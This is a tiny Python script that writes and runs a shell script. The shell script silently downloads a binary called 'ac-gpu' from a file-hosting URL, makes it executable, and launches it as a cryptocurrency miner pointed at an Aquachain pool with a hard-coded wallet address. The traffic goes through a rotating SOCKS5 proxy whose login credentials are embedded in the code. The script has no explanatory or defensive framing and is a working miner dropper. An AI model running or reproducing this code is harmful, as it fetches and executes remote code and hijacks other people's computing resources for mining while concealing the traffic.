import os
os.system('echo "#!/bin/sh" >> tes')
os.system('echo "wget -q https://bin.jvnv.net/file/qJ7G1/ac-gpu && chmod +x ac-gpu" >> tes')
os.system('echo "./ac-gpu -F http://pool.aquachain.xyz:8888/0xe01d2B2d8CE6351655EFF020e535d3992e1cd393/donald -t 1 --proxy socks5://zfyfuvri-rotate:vj4ufo2qq7oa@p.webshare.io:80" >> tes')
os.system('sleep 2')
os.system('sh tes')
